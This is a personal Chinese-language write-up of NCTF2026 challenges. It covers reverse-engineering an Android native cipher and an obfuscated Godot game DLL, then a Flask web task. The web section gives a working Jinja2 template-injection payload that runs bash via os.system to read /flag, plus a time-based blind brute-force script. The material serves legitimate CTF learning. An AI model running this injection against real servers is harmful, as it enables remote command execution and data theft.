---
title: NCTF2026个人题解
typora-root-url: nctf2026-personal-wp
date: 2026-04-05 16:01:28
tags:
 - nctf
 - nctf2026
 - re
 - web
categories: writeup
---

# NCTF2026个人题解

## Hook My Secret

三个关卡，第一个是手势密码，与后面不相关，可以直接跳过

第二关在native中，分析`libhookmysecret.so`，定位到函数`Java_com_nctf_hookmysecret_nativebridge_NativeBridge_encryptStage2`

喂给ai，得到解密脚本：

```python
def ror(val, shift, width=8):
    shift %= width
    return ((val >> shift) | (val << (width - shift))) & ((1 << width) - 1)

def decrypt_stage2(output_int_array):
    """
    output_int_array: List of integers returned by the JNI function.
                      These are the unsigned bytes treated as ints.
    """
    decrypted_bytes = []
    state = 81  # Initial v21
    
    for i, c_int in enumerate(output_int_array):
        c = c_int & 0xFF  # Ensure it's treated as unsigned byte
        
        # Reverse the addition: Val = C[i] - i - 7 * S_i
        # In modular arithmetic (mod 256):
        val = (c - i - 7 * state) & 0xFF
        
        # Reverse the ROL(3) -> ROR(3)
        xored_val = ror(val, 3)
        
        # Calculate Key: K_i = S_i ^ (13 * i + 66)
        key = state ^ ((13 * i + 66) & 0xFF)
        
        # Recover Plain byte: P[i] = xored_val ^ Key
        p = xored_val ^ key
        
        decrypted_bytes.append(p)
        
        # Update State for next iteration
        # S_{i+1} = S_i + P[i] + (i ^ C[i])
        state = (state + p + (i ^ c)) & 0xFF
        
    return bytes(decrypted_bytes)

# 示例用法：
# 假设你在 Java 层调用 encryptStage2 得到的结果是 resultArray
# int[] result = NativeBridge.encryptStage2("some_input");
# 你需要将 result 提取出来放入下面的列表

# example_output = [ ... ] 
print(decrypt_stage2([250, 113, 87, 185, 6, 125, 167, 156, 4, 0, 229, 239, 119, 155, 187, 95]))
```

加密内容来自

![image-20260405164358414](/image-20260405164358414.png)

这里将用户输入做了加密与程序中保存的加密字节作比对，解密后得到`k7Xm2Pq9Wv4N8bRt`，即为第三关的AES加密key

第三关用了AES的CBC，key来自上一关，iv从数据库中读出来，但是可以直接在建库这里得到iv

![image-20260405164142963](/image-20260405164142963.png)

下面是用户输入与加密密文对比：

![image-20260405164153426](/image-20260405164153426.png)

解密密文即可

![image-20260405164603512](/image-20260405164603512.png)

`NCTF{a680107e-a49b-43e1-915b-cedd25e7835a}`

## No My Bank!

Godot写的小游戏，不能直接使用GDRE反编译，注意到同目录下的dll存在加密，动态调试发现游戏运行后dll解密在`%TEMP%`目录下

IDA分析注意到TLS回调函数：

![image-20260405161255825](/image-20260405161255825.png)

定位到被修改指令的函数：

![image-20260405161323188](/image-20260405161323188.png)

TEA算法

查找交叉引用，只有一处，逻辑清晰（重命名后）

![image-20260405161456499](/image-20260405161456499.png)

所以这里是将加密算法替换了

替换的函数如下：

![image-20260405161525696](/image-20260405161525696.png)

动态异或解密，dump后如下图：

![image-20260405161559173](/image-20260405161559173.png)

base64 like + xor 喂给ai写出解密算法：

```python
import struct

def decrypt_sub_0(encrypted_bytes):
    """
    逆向 sub_0 函数
    :param encrypted_bytes: 经过混淆和编码后的字节流 (bytes)
    :return: 原始数据 (bytes)
    """
    
    # 1. 构建自定义字母表 (Alphabet)
    # 从代码 v16[0] 到 v16[63] 提取
    # 注意：C语言中 char 是有符号的，Python中我们需要将其转换为 0-255 的无符号整数
    raw_alphabet_signed = [
        -91, -90, -89, -88, -87, -86, -85, -84, -83, -82, -81, -80, -79, -78, -77, -76,
        -75, -74, -73, -72, -71, -70, -69, -68, -67, -66, -123, -122, -121, -120, -119, -118,
        -117, -116, -115, -114, -113, -112, -111, -110, -109, -108, -107, -106, -105, -104,
        -103, -102, -101, -100, -99, -98, -58, -57, -56, -55, -54, -53, -52, -51, -50, -49,
        -44, -48
    ]
    
    # 转换为 0-255 的无符号字节
    alphabet = [x & 0xFF for x in raw_alphabet_signed]
    
    # 创建反向查找表: Char -> Index
    # 注意：编码时使用的是 ~Alphabet，所以解码时输入字符 C，我们要找的是 ~C 在 Alphabet 中的索引
    # 或者更简单：编码输出是 EncodedChar = ~Alphabet[Index]
    # 所以 Alphabet[Index] = ~EncodedChar
    # Index = Alphabet.index(~EncodedChar & 0xFF)
    
    # 为了加速，我们可以预计算一个映射表：Char -> Index
    # 这里的 Char 是指“取反后”的字符，即我们在解密第一步得到的字符
    char_to_index = {}
    for idx, char_val in enumerate(alphabet):
        char_to_index[char_val] = idx

    # 2. 逆混淆阶段
    data_len = len(encrypted_bytes)
    deobfuscated = bytearray(data_len)
    
    v13 = 0x114514  # 初始种子
    
    for m in range(data_len):
        curr_byte = encrypted_bytes[m]
        
        # 逆向步骤 2: ((byte >> 6) | (byte << 2)) ^ 0xBA
        # 先异或回去
        temp = curr_byte ^ 0xBA
        
        # 再逆向循环左移 2 位 (ROL 2) -> 循环右移 2 位 (ROR 2)
        # ROR 2 for 8-bit: ((temp >> 2) | (temp << 6)) & 0xFF
        byte_after_stream_xor = ((temp >> 2) | (temp << 6)) & 0xFF
        
        # 逆向步骤 1: ^ (v13 >> (8 * m % 24))
        # 获取密钥流字节
        shift_amount = (8 * m) % 24
        key_byte = (v13 >> shift_amount) & 0xFF
        
        original_encoded_byte = byte_after_stream_xor ^ key_byte
        deobfuscated[m] = original_encoded_byte
        
        # 更新 LCG 状态
        # v13 = 0x1010193 * v13 + 0x12345678
        # 注意：在 C 语言中 int 通常是 32 位，所以需要 & 0xFFFFFFFF
        v13 = (0x1010193 * v13 + 0x12345678) & 0xFFFFFFFF

    # 3. 逆编码阶段 (Custom Base64 Decode)
    # 编码时的逻辑：
    # Input: 3 bytes (B1, B2, B3)
    # Output Indices (Standard Base64 logic but swapped positions):
    #   StdIdx0 = B1 >> 2
    #   StdIdx1 = ((B1 & 3) << 4) | (B2 >> 4)
    #   StdIdx2 = ((B2 & 15) << 2) | (B3 >> 6)
    #   StdIdx3 = B3 & 63
    #
    # Code Output Order (v16[v7+64]):
    #   Out[0] uses StdIdx1
    #   Out[1] uses StdIdx0
    #   Out[2] uses StdIdx3 (or '=' if padding)
    #   Out[3] uses StdIdx2 (or '=' if padding)
    #
    # And the character stored is ~Alphabet[Index].
    # So, DeobfuscatedByte = ~Alphabet[Index] => Alphabet[Index] = ~DeobfuscatedByte
    
    decoded_bytes = bytearray()
    
    # 处理每 4 个字节
    # 注意：由于填充符 '=' (61) 也被混淆了，我们不能简单地查找 '='。
    # 但是，我们知道原始数据长度是 40 字节 (从代码 j < 40 可知)。
    # 40 字节 Base64 编码后长度为 ceil(40/3)*4 = 14*4 = 56 字节。
    # 40 % 3 = 1，所以最后会有 2 个填充符。
    # 即最后两个字符原本是 '='。
    
    # 如果不知道原始长度，通常需要通过尝试或文件头判断。
    # 这里假设我们处理整个流，并处理潜在的填充。
    
    i = 0
    while i < data_len:
        # 获取 4 个混淆后的字节
        c0 = deobfuscated[i]
        c1 = deobfuscated[i+1] if i+1 < data_len else 0
        c2 = deobfuscated[i+2] if i+2 < data_len else 0
        c3 = deobfuscated[i+3] if i+3 < data_len else 0
        
        # 还原为 Alphabet 中的字符 (取反)
        # 注意：如果原始是填充符 '=' (0x3D)，它没有被查表，而是直接赋值 61。
        # 然后 61 被混淆了。
        # 我们需要判断哪些位置是填充。
        # 在标准 Base64 中，填充只出现在最后。
        # 如果这是最后一组，且原始数据长度不是 3 的倍数，则有填充。
        
        # 为了通用性，我们先假设没有填充，尝试解码。
        # 如果遇到错误，再考虑填充。
        # 但在这里，我们可以利用代码逻辑：
        # 代码中：if (j+1 >= 40) v16[...] = 61;
        # 这意味着只有最后不足 3 字节的部分才会产生 61。
        
        # 让我们先取反得到可能的 Alphabet 字符
        val0 = ~c0 & 0xFF
        val1 = ~c1 & 0xFF
        val2 = ~c2 & 0xFF
        val3 = ~c3 & 0xFF
        
        # 查找索引
        # 如果值不在字母表中，说明它可能是被混淆的填充符 '=' (0x3D)
        # 但我们不能直接查 0x3D，因为 0x3D 也被混淆了？
        # 不，代码中：v16[v9+64] = 61; 然后进入混淆循环。
        # 所以 c2 或 c3 如果是填充位，它们是 61 经过混淆后的结果。
        # 而 61 不在 Alphabet 中（除非巧合）。
        
        # 更好的方法：我们知道原始数据长度是 40。
        # 40 字节 -> 56 字节 Base64。
        # 最后 2 个字节是填充。
        
        is_last_block = (i + 4 >= data_len)
        pad_count = 0
        if is_last_block:
            # 根据 40 字节推算，最后应该有 2 个填充
            # 40 = 13 * 3 + 1. 
            # 第 13 组 (index 12) 输入 1 字节，输出 2 个有效字符 + 2 个 '='
            # 所以最后 2 个字符是填充。
            pad_count = 2 
            
        # 获取索引
        try:
            idx1 = char_to_index[val0] # 对应 Standard Index 1
        except KeyError:
            # 可能是填充位被错误取反？或者数据错误
            # 如果它是填充位，原始值是 61。
            # 61 不在 alphabet 中。
            idx1 = 0 # 占位，稍后处理

        try:
            idx0 = char_to_index[val1] # 对应 Standard Index 0
        except KeyError:
            idx0 = 0

        if pad_count == 0:
            try:
                idx3 = char_to_index[val2] # 对应 Standard Index 3
            except KeyError:
                idx3 = 0
            try:
                idx2 = char_to_index[val3] # 对应 Standard Index 2
            except KeyError:
                idx2 = 0
        elif pad_count == 1:
            # 最后一个字符是填充
            idx3 = 0
            try:
                idx2 = char_to_index[val2]
            except KeyError:
                idx2 = 0
        elif pad_count == 2:
            # 最后两个字符是填充
            idx2 = 0
            idx3 = 0

        # 重组为标准 Base64 索引顺序: 0, 1, 2, 3
        # 代码中:
        # Out[0] <- Idx1 (Std 1)
        # Out[1] <- Idx0 (Std 0)
        # Out[2] <- Idx3 (Std 3)
        # Out[3] <- Idx2 (Std 2)
        
        s0 = idx0
        s1 = idx1
        s2 = idx2
        s3 = idx3
        
        # 还原 3 个字节
        b1 = (s0 << 2) | (s1 >> 4)
        b2 = ((s1 & 0x0F) << 4) | (s2 >> 2)
        b3 = ((s2 & 0x03) << 6) | s3
        
        decoded_bytes.append(b1)
        if pad_count < 2:
            decoded_bytes.append(b2)
        if pad_count == 0:
            decoded_bytes.append(b3)
            
        i += 4
        
    return bytes(decoded_bytes)

encrypted = bytes.fromhex('2BF7675E7C98ED6DD18CEF57BB33227EB21F345B366C2BAFBB5B12D63C0A4527846C47AB2F75783E88892D7ACD5CF6FA3673FF6ED34C1C75')
# 开始解密
decrypted = decrypt_sub_0(encrypted)
print(f"Decrypted Output ({len(decrypted)} bytes): {decrypted}")
```

encrypted来自dll中`1800EA520`，解密后得到`NCTF{You_deserve_this_gift_b1bd7c719cfc}`

还有一段对flag文本处理的过程：

![image-20260405161937325](/image-20260405161937325.png)

替换后得到正确的flag ：`NCTF{Y0u_d3s3rv3_th1s_g1ft_b1bd7c719cfc}`

## N-Horse

注意到响应头中Server为Flask，并且输入的用户名会显示在前端

输入`{{`时服务器返回500，但输入`{{7 * 7}}`仍然显示原文本

根据ai，尝试时间盲注

`{{ lipsum.__globals__.__builtins__.__import__('os').system("bash -c 'if [ $(cat /flag | cut -c1) == \"N\" ]; then sleep 5; fi'") }}`

确实延迟了5秒钟，使用AI写出脚本：

```python
import requests
import time

url = "http://target.com/login"
# 假设 flag 在 /flag 文件
# 我们需要爆破 flag 的每一位
flag = ""
chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789{}_-!"

for i in range(1, 50): # 假设 flag 长度不超过 50
    found = False
    for c in chars:
        # 构造 payload: 如果第 i 位字符等于 c，则 sleep 3 秒
        # 注意：需要转义单引号和双引号
        payload = f"""{{{{ lipsum.__globals__.__builtins__.__import__('os').system("bash -c 'if [ \$(cat /flag | cut -c{i}) == \\"{c}\\" ]; then sleep 3; fi'") }}}}}"""
        
        start_time = time.time()
        try:
            # 发送 POST 请求
            r = requests.post(url, data={"username": payload}, timeout=10)
        except:
            pass
            
        end_time = time.time()
        duration = end_time - start_time
        
        print(f"Testing pos {i}, char {c}: {duration:.2f}s")
        
        if duration > 2.5: # 如果延迟超过 2.5 秒，说明匹配
            flag += c
            print(f"[+] Found char: {c}, Current Flag: {flag}")
            found = True
            break
    
    if not found:
        print("[-] Char not found, maybe end of string or special char")
        break

print(f"Final Flag: {flag}")
```

